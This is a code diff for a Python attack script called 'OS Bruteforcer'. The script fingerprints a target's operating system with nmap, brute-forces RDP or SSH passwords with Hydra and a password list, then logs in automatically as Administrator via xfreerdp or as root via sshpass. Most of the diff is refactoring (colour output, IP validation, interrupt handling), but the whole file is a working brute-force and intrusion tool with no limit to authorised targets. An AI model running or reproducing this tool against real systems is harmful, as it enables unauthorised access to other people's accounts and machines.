@@ -1,51 +1,20 @@
 #!/usr/bin/env python3
 import re
+import os
 import subprocess
 import time
-import os
+import sys
 from colorama import init, Fore, Style
+from termcolor import colored
+from animation import banner
 
-# Initialize colorama
 init(autoreset=True)
-def print_blue(text):
-    """Print text in blue color."""
-    print(Fore.BLUE + text)
 
-def print_in_red(text):
-    """Print text in red."""
-    RED = "\033[91m"
-    RESET = "\033[0m"
-    print(f"{RED}{text}{RESET}")
-
-def banner():
-    """Show animated figlet banner with small author line."""
-    try:
-        # Big figlet text for the tool name
-        result = subprocess.run(
-            ["figlet", "OS Bruteforcer"],
-            capture_output=True, text=True, check=True
-        )
-        for line in result.stdout.splitlines():
-            print_blue(line)
-            time.sleep(0.05)
-
-        # Small author line (not figlet, just plain text)
-        author = "<< Author: cyb2rS2c >>"
-        for ch in author:
-            print(Fore.YELLOW + ch, end="", flush=True)
-            time.sleep(0.03)
-        print()  # newline after animation
-
-    except FileNotFoundError:
-        # Fallback banner if figlet is missing
-        print_blue("=== OS Bruteforcer ===")
-        print(Fore.YELLOW + "<< Author: cyb2rS2c >>")
-
+def validate_ip(target_ip):
+    ip_pattern = re.compile(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$')
+    return bool(ip_pattern.match(target_ip))
 
 def detect_os(target_ip):
-    """
-    Detect the operating system of the target machine using nmap, with a focus on detecting macOS.
-    """
     try:
         nmap_command = [
             'sudo', 'nmap', '-O', '--osscan-guess', '--fuzzy',
@@ -65,7 +34,7 @@ def detect_os(target_ip):
         print(f"Nmap output:\n{nmap_output}")
 
     except subprocess.CalledProcessError as e:
-        print_in_red(f"Error detecting OS: {e}. Nmap output: {e.stderr}")
+        print(colored(f"Error detecting OS: {e}. Nmap output: {e.stderr}", 'red'))
     
     return None
 
@@ -76,7 +45,7 @@ def run_hydra(target_ip, password_file, wait_time=1):
     try:
         target_os = detect_os(target_ip)
         if not target_os:
-            print_in_red(f"Could not determine the operating system of the target: {target_ip}.")
+            print(colored(f"Could not determine the operating system of the target: {target_ip}.", 'red'))
             return
 
         if target_os == 'windows':
@@ -92,14 +61,14 @@ def run_hydra(target_ip, password_file, wait_time=1):
             match = re.search(r'\[3389\]\[rdp\] host: {}.*?password: (\S+)'.format(target_ip), hydra_output, re.DOTALL)
             if match:
                 password_success = match.group(1)
-                print_blue(f"Found successful password: {password_success}")
+                print(colored(f"Found successful password: {password_success}", 'blue'))
                 time.sleep(5)
                 xfreerdp_command = ['xfreerdp', f'/u:Administrator', f'/p:{password_success}', f'/v:{target_ip}']
                 print(f"Connecting to {target_ip} using xfreerdp...")
                 subprocess.run(xfreerdp_command, check=True)
-                print_blue(f"Connected to {target_ip} using xfreerdp.")
+                print(colored(f"Connected to {target_ip} using xfreerdp.", 'blue'))
             else:
-                print_in_red("No successful password found for RDP.")
+                print(colored("No successful password found for RDP.", 'red'))
         
         elif target_os == 'mac':
             hydra_command = [
@@ -114,32 +83,45 @@ def run_hydra(target_ip, password_file, wait_time=1):
             match = re.search(r'\[22\]\[ssh\] host: {}.*?password: (\S+)'.format(target_ip), hydra_output, re.DOTALL)
             if match:
                 password_success = match.group(1)
-                print_blue(f"Found successful password: {password_success}")
+                print(colored(f"Found successful password: {password_success}", 'blue'))
                 time.sleep(5)
                 ssh_command = ['sshpass', '-p', password_success, 'ssh', f'root@{target_ip}']
                 print(f"Connecting to {target_ip} using SSH...")
                 subprocess.run(ssh_command, check=True)
-                print_blue(f"Connected to {target_ip} using SSH.")
+                print(colored(f"Connected to {target_ip} using SSH.", 'blue'))
             else:
-                print_in_red("No successful password found for SSH.")
+                print(colored("No successful password found for SSH.", 'red'))
     
     except subprocess.CalledProcessError as e:
-        print_in_red(f"Error executing command: {e}")
-        print_in_red(f"Hydra stdout:\n{e.stdout}")
-        print_in_red(f"Hydra stderr:\n{e.stderr}")
+        print(colored(f"Error executing command: {e}", 'red'))
+        print(colored(f"Hydra stdout:\n{e.stdout}", 'red'))
+        print(colored(f"Hydra stderr:\n{e.stderr}", 'red'))
+    
+    except KeyboardInterrupt:
+        print("\nProcess interrupted by user. Exiting...")
+        sys.exit(0)
 
 def main():
     banner()
 
-    # Ask user for target IP
-    target_ip = input('Enter the target IP of the device (Windows or macOS, e.g., 192.168.xx.xx): ').strip()
+    while True:
+        try:
+            target_ip = input('Enter the target IP of the device (Windows or macOS, e.g., 192.168.xx.xx): ').strip()
+            if validate_ip(target_ip):
+                break
+            else:
+                print(colored("Invalid IP address format. Please enter a valid IP (e.g., 192.168.xx.xx).", 'red'))
+        except KeyboardInterrupt:
+            print("\nProcess interrupted by user. Exiting...")
+            sys.exit(0)
 
-    # Flexible password file
-    file = 'pass.txt'
+    file = 'assets/pass.txt'
     password_file = os.path.abspath(file)
-
-    run_hydra(target_ip, password_file, wait_time=3)
-
+    
+    try:
+        run_hydra(target_ip, password_file, wait_time=3)
+    except KeyboardInterrupt:
+        print("\nProcess interrupted by user. Exiting...")
 
 if __name__ == "__main__":
     main()
